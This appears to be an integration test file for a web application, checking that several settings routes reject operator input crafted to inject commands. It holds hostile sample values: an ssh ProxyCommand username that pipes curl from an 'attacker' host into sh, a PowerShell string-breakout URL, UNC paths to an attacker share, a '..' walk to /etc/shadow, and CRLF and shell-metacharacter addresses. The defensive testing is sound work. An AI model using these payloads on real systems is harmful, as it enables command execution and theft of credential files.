/**
 * tests/integration/operatorInputInjection.test.ts
 *
 * Business rule 107 at the HTTP boundary: text an operator types reaches a
 * command line, a generated script or a generated connection only after it has
 * been checked, and the routes that accept it say no.
 *
 *   F162  archive settings  -> ssh / sftp / scp argv
 *   F163  agent server URL  -> agent.conf and the Windows installer script
 *   F194  process log glob  -> read by the agent as a privileged user
 *   F257  asset address     -> .rdp file, ssh:// link, pasted command
 *
 * Skips cleanly when DATABASE_URL isn't reachable; see _helpers.ts.
 */

import { it, expect, beforeAll, afterAll } from "vitest";
import request from "supertest";
import { app } from "../../src/app.js";
import { prisma } from "../../src/db.js";
import { authedAgent, dbDescribe, dbReachable, ensureTestUser } from "./_helpers.js";
import { createToken } from "../../src/services/apiTokenService.js";
import { createRole, deleteRole } from "../../src/services/roleService.js";

const d = dbDescribe;

const WRITE_ROLE = "test-input-assets-write";
const FULL_ROLE = "test-input-assets-fullwrite";
const TOKEN_PREFIX = "test-input-";
const HOSTNAME = "test-input-asset-01";

let writeRoleId = "";
let fullRoleId = "";
let writeToken = "";
let fullToken = "";
let assetId = "";

const bearer = (raw: string) => ({ Authorization: `Bearer ${raw}` });

async function cleanup() {
  await prisma.apiToken.deleteMany({ where: { name: { startsWith: TOKEN_PREFIX } } });
  const ids = (await prisma.asset.findMany({ where: { hostname: HOSTNAME }, select: { id: true } })).map((a) => a.id);
  await prisma.assetProcessConfig.deleteMany({ where: { assetId: { in: ids } } });
  await prisma.asset.deleteMany({ where: { hostname: { in: [HOSTNAME, "test-input-bad-address"] } } });
  await prisma.role.deleteMany({ where: { name: { in: [WRITE_ROLE, FULL_ROLE] } } });
}

beforeAll(async () => {
  if (!dbReachable) return;
  await prisma.$connect();
  await ensureTestUser();
  await cleanup();
  writeRoleId = (await createRole({ name: WRITE_ROLE, permissions: { assets: "write" } })).id;
  fullRoleId = (await createRole({ name: FULL_ROLE, permissions: { assets: "fullwrite" } })).id;
  writeToken = (await createToken({ name: `${TOKEN_PREFIX}write`, roleId: writeRoleId, createdBy: "integration-test" })).rawToken;
  fullToken = (await createToken({ name: `${TOKEN_PREFIX}full`, roleId: fullRoleId, createdBy: "integration-test" })).rawToken;
  assetId = (await prisma.asset.create({ data: { hostname: HOSTNAME, assetType: "server", status: "active", ipAddress: "10.0.0.77" } })).id;
});

afterAll(async () => {
  if (!dbReachable) return;
  await cleanup();
  await deleteRole(writeRoleId).catch(() => {});
  await deleteRole(fullRoleId).catch(() => {});
  await prisma.$disconnect();
});

d("archive settings (F162)", () => {
  it("refuses a username that ssh would read as an option, and stores nothing", async () => {
    const { agent, csrf } = await authedAgent(app);
    const before = await prisma.setting.findUnique({ where: { key: "eventArchive" } });
    const res = await agent
      .put("/api/v1/events/archive-settings")
      .set("X-CSRF-Token", csrf)
      .send({ host: "archive.example.com", username: "-oProxyCommand=curl http://attacker/s|sh" });
    expect(res.status).toBe(400);
    const after = await prisma.setting.findUnique({ where: { key: "eventArchive" } });
    expect(JSON.stringify(after?.value ?? null)).toBe(JSON.stringify(before?.value ?? null));
  });

  it("refuses a hostile host and a port outside range", async () => {
    const { agent, csrf } = await authedAgent(app);
    for (const body of [{ host: "-oProxyCommand=id" }, { host: "a b" }, { port: 70000 }, { protocol: "ftp" }]) {
      const res = await agent.put("/api/v1/events/archive-settings").set("X-CSRF-Token", csrf).send(body);
      expect(res.status).toBe(400);
    }
  });

  it("answers a hostile connection test with ok:false instead of dialling", async () => {
    const { agent, csrf } = await authedAgent(app);
    const res = await agent
      .post("/api/v1/events/archive-test")
      .set("X-CSRF-Token", csrf)
      .send({ host: "archive.example.com", username: "-oProxyCommand=id", protocol: "scp", port: 22 });
    expect(res.status).toBe(200);
    expect(res.body.ok).toBe(false);
    expect(res.body.message).toMatch(/username/);
  });
});

d("agent server URL (F163)", () => {
  const KEY = "agent.serverUrlOverride";

  it("refuses a URL that would close the installer script's string literal", async () => {
    const { agent, csrf } = await authedAgent(app);
    await prisma.setting.deleteMany({ where: { key: KEY } });
    for (const url of ["https://example.com/';Start-Process calc;'", "https://example.com/a b", "https://example.com/’;calc;’"]) {
      const res = await agent.put("/api/v1/server-settings/agents/server-url").set("X-CSRF-Token", csrf).send({ url });
      expect(res.status).toBe(400);
    }
    expect(await prisma.setting.findUnique({ where: { key: KEY } })).toBeNull();
  });

  it("stores a clean URL in canonical form, then clears it", async () => {
    const { agent, csrf } = await authedAgent(app);
    const ok = await agent
      .put("/api/v1/server-settings/agents/server-url")
      .set("X-CSRF-Token", csrf)
      .send({ url: "https://polaris.example.com:3000/" });
    expect(ok.status).toBe(200);
    expect(ok.body.override).toBe("https://polaris.example.com:3000");
    const cleared = await agent.put("/api/v1/server-settings/agents/server-url").set("X-CSRF-Token", csrf).send({ url: "" });
    expect(cleared.status).toBe(200);
    expect(await prisma.setting.findUnique({ where: { key: KEY } })).toBeNull();
  });
});

d("process log path glob (F194)", () => {
  const url = () => `/api/v1/assets/${assetId}/processes/nginx/config`;

  it("lets Assets Read-Write change the log source but not set a glob", async () => {
    const res = await request(app).put(url()).set(bearer(writeToken)).send({ logSource: "file-glob", logPathGlob: "/var/log/nginx/*.log" });
    expect(res.status).toBe(403);
    const stored = await prisma.assetProcessConfig.findFirst({ where: { assetId, name: "nginx" } });
    expect(stored?.logPathGlob ?? null).toBeNull();

    const sourceOnly = await request(app).put(url()).set(bearer(writeToken)).send({ logSource: "journald-unit" });
    expect(sourceOnly.status).toBe(200);
  });

  it("lets Assets Full Read-Write set a local absolute glob", async () => {
    const res = await request(app).put(url()).set(bearer(fullToken)).send({ logSource: "file-glob", logPathGlob: "/var/log/nginx/*.log" });
    expect(res.status).toBe(200);
    expect(res.body.config.logPathGlob).toBe("/var/log/nginx/*.log");
  });

  it("keeps working for Read-Write when the glob is resaved unchanged", async () => {
    const res = await request(app).put(url()).set(bearer(writeToken)).send({ logSource: "file-glob", logPathGlob: "/var/log/nginx/*.log" });
    expect(res.status).toBe(200);
  });

  it("refuses a network share, a device path, a relative path and a .. walk even for Full Read-Write", async () => {
    for (const logPathGlob of ["\\\\attacker\\share\\x.log", "//attacker/share/x.log", "\\\\.\\PhysicalDrive0", "logs/*.log", "/var/log/../../etc/shadow"]) {
      const res = await request(app).put(url()).set(bearer(fullToken)).send({ logSource: "file-glob", logPathGlob });
      expect(res.status).toBe(400);
    }
    const stored = await prisma.assetProcessConfig.findFirst({ where: { assetId, name: "nginx" } });
    expect(stored?.logPathGlob).toBe("/var/log/nginx/*.log");
  });

  it("lets Read-Write clear the glob", async () => {
    const res = await request(app).put(url()).set(bearer(writeToken)).send({ logSource: "auto", logPathGlob: null });
    expect(res.status).toBe(200);
    expect(res.body.config.logPathGlob).toBeNull();
  });
});

d("asset address (F257)", () => {
  it("refuses an address carrying a line break or shell metacharacters, on create and on update", async () => {
    const { agent, csrf } = await authedAgent(app);
    for (const ipAddress of ["10.0.0.9\r\nenable credssp support:i:0", "10.0.0.9\nx", "10.0.0.9; id", "10.0.0.9 -oProxyCommand=id", "$(id)"]) {
      const created = await agent
        .post("/api/v1/assets")
        .set("X-CSRF-Token", csrf)
        .send({ hostname: "test-input-bad-address", ipAddress, assetType: "server" });
      expect(created.status).toBe(400);
      const updated = await agent.put(`/api/v1/assets/${assetId}`).set("X-CSRF-Token", csrf).send({ ipAddress });
      expect(updated.status).toBe(400);
    }
    expect(await prisma.asset.findFirst({ where: { hostname: "test-input-bad-address" } })).toBeNull();
    expect((await prisma.asset.findUnique({ where: { id: assetId } }))?.ipAddress).toBe("10.0.0.77");
  });

  it("still accepts IPv4, IPv6 and hostnames", async () => {
    const { agent, csrf } = await authedAgent(app);
    for (const ipAddress of ["10.0.0.78", "fd00::78", "app-01.corp.example.com"]) {
      const res = await agent.put(`/api/v1/assets/${assetId}`).set("X-CSRF-Token", csrf).send({ ipAddress });
      expect(res.status).toBe(200);
    }
  });
});
